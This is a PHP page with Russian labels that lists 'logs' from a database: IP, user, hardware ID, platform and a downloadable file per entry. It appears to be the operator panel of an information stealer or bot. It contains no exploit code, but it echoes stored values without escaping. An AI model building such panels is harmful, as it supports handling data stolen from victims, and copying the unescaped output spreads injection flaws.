<style>
	table{height: auto;width:100%;margin-top: -5px;}
	td{padding: 13px 36px;font-size: 11px;border-right: 1px #4e4d4d solid;}
	th > i{ cursor:pointer; }
	 tr:hover{ background:#444; }
	 b{    color: red;font-size: 13px;cursor: pointer; }
	 #info_ip > b{ color:#ffffff;font-weight: 600; }
	@media screen and (min-width: 115px) and (max-width: 805px) 
	{ 
		table > tbody > tr > th{font-size: 10px;padding: 8px 0;}
		td{padding:12px 1px;font-size: 10px;word-wrap: break-word;word-break: break-all;}
		.filter{height: 110px;}
		.filter > .word{width:48%;margin-bottom: 8px;}
		.filter > label {font-size: 10px;color: #242222;font-weight: 900;}
	}
	.size{color: #fff59a;font-size: 11px;}
</style>


	<div class='info'>
		<h2>Логи</h2>
	</div>	
	<?
		$s = "SELECT `id`,`ip`,`file`,`user`,`hwid`,`ip_info`,`date`,`platform` FROM `logs` ORDER BY `id` DESC";
		$r = mysqli_query($db,$s);
		$num = mysqli_num_rows($r);
		
	
	?>
	<input type='hidden' id='current' value='<?=$num;?>'>
	<input type='hidden' id='current_sort'  value='0'>
	

	<input type='hidden' id='del_self' value='0'>
	
	<input type='hidden' id='col0' class='col_x' t='desc'>
	<input type='hidden' id='col1' class='col_x' t='desc'>
	<input type='hidden' id='col2' class='col_x' t='desc'>
	<input type='hidden' id='col3' class='col_x' t='desc'>
	<input type='hidden' id='col4' class='col_x' t='desc'>
	<input type='hidden' id='col5' class='col_x' t='desc'>
	
	<div class='filter'>
	<label class='tit'>Искать</label>
	<label>Текст</label>
	<input type='text' name='word' class='word' id='word_searh' placeholder='gwerty' title='Введите текст для поиска'>
	
	<label>Выберите колонку</label>
	<select id='sel_col'>
		<option value='0'>Date</option>
		<option value='1'>IP</option>
		<option value='2' >User</option>
		<option value='3'>hwid</option>
	</select>
		
		
	<label class='count'>Всего: <?=$num;?></label>	
	
	</div>
	
	<div id='result'>
	<table >
		<th> <i class="fa fa-sort sorted" aria-hidden="true" value='0' title="Сортировать"></i> Date</th>
		<th> <i class="fa fa-sort sorted" aria-hidden="true" value='1' title="Сортировать"></i> IP</th>
		<th> <i class="fa fa-sort sorted" aria-hidden="true" value='2' title="Сортировать"></i> User</th>
		<th> <i class="fa fa-sort sorted" aria-hidden="true" value='3' title="Сортировать"></i> Hwid</th>
		<th> <i class="fa fa-sort sorted" aria-hidden="true" value='3' title="Сортировать"></i> Platform</th>
		<th> <i class="fa fa-sort sorted" aria-hidden="true" value='4' title="Сортировать"></i> File</th>
		<th></th>
		<?
			
			while($ok = mysqli_fetch_assoc($r))
			{
				$unix = intval($ok['date']);
				if($unix > 1){ $date = date('d.m.Y h:i',$unix); } else { $date = ''; }
				
				$log_name = substr($ok['file'],0,25);
				$file_ = $_SERVER['DOCUMENT_ROOT'].site_dir.'/files/'.$ok['file'];
				$size = get_filesize($file_);
		?>
			<tr id="log_<?=$ok['id'];?>">
				<td><?=$date;?></td>
				<td>
				<i class="fa fa-info-circle ip" ip="<?=$ok['id'];?>" aria-hidden="true"></i> <?=$ok['ip'];?></td>
				<td><?=$ok['user'];?></td>
				<td><?=$ok['hwid'];?></td>
				<td><?=$ok['platform'];?></td>
				<td><a  target='_blank' href='<?=site_dir;?>/files/<?=$ok['file'];?>'><?=$log_name;?> <b class='size'>[ <?=$size;?> ]</b></a></td>
				<td style="width:9px;"><b class="del_log"  value="<?=$ok['id'];?>" title="Удалить запись?">X</b></td>
			</tr>
		<?}?>
			
			</table>
			</div>
			
			
			

